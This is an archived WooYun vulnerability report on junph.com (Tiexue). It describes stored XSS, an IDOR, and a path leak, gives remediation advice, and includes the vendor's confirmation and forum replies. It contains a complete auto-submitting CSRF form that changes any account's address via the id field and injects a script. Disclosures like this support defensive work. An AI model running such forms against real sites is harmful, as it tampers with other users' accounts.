{"id": 17640, "wybug_id": "wooyun-2012-010311", "wybug_title": "铁血各种缺陷结合希望重视。", "wybug_corp": "北京铁血科技", "wybug_author": "_Evil", "wybug_date": "2012-07-29 17:50", "wybug_open_date": "2012-09-12 17:50", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-08-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-09-12：\t细节向公众公开  简要描述： NuLL. 详细说明：  http://app.junph.com/Client/MyAddress.aspx存储Xss:街道地方\n\n\n\nCSRF:\n<form action=\"http://app.junph.com/CallBack/UserCenterCallBack.ashx\" method=\"post\"><input type=\"test\" name=\"type\" value=\"edit\"/><input type=\"test\" name=\"userName\" value=\"wooyun\"/><input type=\"test\" name=\"provice\" value=\"%25E5%25AE%2589%25E5%25BE%25BD\"/><input type=\"test\" name=\"city\" value=\"%25E5%25B7%25A2%25E6%25B9%2596\"/><input type=\"test\" name=\"street\" value=\"%3cscript%3ealert(%2fxss%2f)%3c%2fscript%3e\"/><input type=\"test\" name=\"zip\" value=\"529600\"/><input type=\"test\" name=\"moblie\" value=\"12345678911\"/><input type=\"test\" name=\"tel\" value=\"\"/><input type=\"test\" name=\"def\" value=\"true\"/><input type=\"test\" name=\"email\" value=\"a13411334452@gmail.com\"/><input type=\"test\" name=\"id\" value=\"90383\"/><script type=\"text/javascript\"> document.forms[0].submit();</script></form>\n最后一个严重了跨域修改:\n<input type=\"test\" name=\"id\" value=\"90383\"/>\nid修改为别人的就中招:id=90386为我其他一个账号(晴天小铸1)\n\n经过测试可用修改任何id=xxx (我测试范围不超过90386)   漏洞证明：  1.Xss:\n\n\n\n2.CSRF\n<form action=\"http://app.junph.com/CallBack/UserCenterCallBack.ashx\" method=\"post\"><input type=\"test\" name=\"type\" value=\"edit\"/><input type=\"test\" name=\"userName\" value=\"wooyun\"/><input type=\"test\" name=\"provice\" value=\"%25E5%25AE%2589%25E5%25BE%25BD\"/><input type=\"test\" name=\"city\" value=\"%25E5%25B7%25A2%25E6%25B9%2596\"/><input type=\"test\" name=\"street\" value=\"%3cscript%3ealert(%2fxss%2f)%3c%2fscript%3e\"/><input type=\"test\" name=\"zip\" value=\"529600\"/><input type=\"test\" name=\"moblie\" value=\"12345678911\"/><input type=\"test\" name=\"tel\" value=\"\"/><input type=\"test\" name=\"def\" value=\"true\"/><input type=\"test\" name=\"email\" value=\"a13411334452@gmail.com\"/><input type=\"test\" name=\"id\" value=\"90383\"/><script type=\"text/javascript\"> document.forms[0].submit();</script></form>\n3.跨域:\n\n商城是外包？送个爆路径:app.junph.com/Shopping/OrderDetail.aspx?OrderCode=201207297887999&gotpay=0\nERP.UI.WEB.APP.Shopping.OrderDetail.Page_Load(Object sender, EventArgs e) in F:\\jobs\\TFS_workspace\\TxErp2\\TxErp\\ERP.UI.WEB.APP\\Shopping\\OrderDetail.aspx.cs\n   修复方案：  使用antixss防御xss你们做到了,街道地方被特殊编码过了所以。。。。。Xss修复:服务端URL编码回来再过滤再编码。CSRF:token Referer (你们站,没有验证码的地方,基本都有CSRF....)跨域问题:你们应该知道的,应该是粗心。爆路径:最简单的,404页面。   版权声明：转载请注明来源 _Evil@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-07-31 18:08 厂商回复： 需要时间全站进行修改，感谢关注铁血 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-29 17:51 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @xsser 铁血杀手 @_@    \n     2012-07-29 18:22 |    \t\t小一 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:13        )\t\t \n  @_Evil 铁血杀手。。。    \n     2012-07-29 18:25 |    \t\t猥琐 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 学习什么的最重要！)\t\t \n  铁血杀手    \n     2012-07-29 19:02 |    \t\tCCOz \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:7        | 本人还是处，有意的富婆请联系我，五万以下...)\t\t \n  @_Evil 铁血杀手，铁血不送你个防狼电棍不能性福    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}